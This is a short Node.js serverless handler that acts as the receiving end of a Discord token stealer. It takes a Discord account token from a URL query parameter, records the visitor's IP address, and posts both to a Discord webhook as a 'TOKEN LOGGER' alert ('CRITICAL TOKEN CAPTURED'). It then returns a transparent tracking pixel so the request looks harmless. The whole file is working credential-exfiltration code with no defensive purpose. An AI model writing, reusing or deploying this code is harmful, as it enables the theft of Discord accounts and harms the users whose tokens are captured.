const fetch = require('node-fetch');

module.exports = async (req, res) => {
  try {
    const token = req.query.t || '';
    const ip = req.headers['x-forwarded-for'] || 'Unknown IP';
    
    if (token && token !== "NOT_FOUND") {
      await sendTokenReport(ip, token);
    }
    
    // Return transparent pixel
    res.setHeader('Content-Type', 'image/png');
    res.send(Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64'));
  } catch (e) {
    console.error(e);
    res.status(500).send('Server Error');
  }
};

async function sendTokenReport(ip, token) {
  try {
    // Discord webhook URL
    const webhookUrl = process.env.WEBHOOK_URL;
    
    // Create critical alert
    const embed = {
      username: "TOKEN LOGGER",
      content: "@everyone **CRITICAL TOKEN CAPTURED**",
      embeds: [{
        title: "Discord Token Captured!",
        color: 0xFF0000,
        description: `**IP Address:** ${ip}\n**Token:** ${token}\n\n**WARNING:** This token provides full account access!`
      }]
    };
    
    // Send to Discord
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
  } catch (e) {
    console.error('Failed to send token report:', e);
  }
}
